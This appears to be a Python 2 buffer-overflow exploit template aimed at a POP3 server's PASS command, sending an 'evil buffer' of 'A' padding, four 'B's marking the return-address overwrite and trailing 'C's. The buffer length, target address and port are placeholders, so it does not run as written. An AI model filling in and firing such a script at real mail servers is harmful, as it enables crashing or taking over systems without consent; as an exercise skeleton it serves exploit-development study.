#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "A" * zzzzzzzzzz + "B" * 4 + "C" * 90

try:
	print "\nSending evil buffer..."
	s.connect(('0.0.0.0',9999999999))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
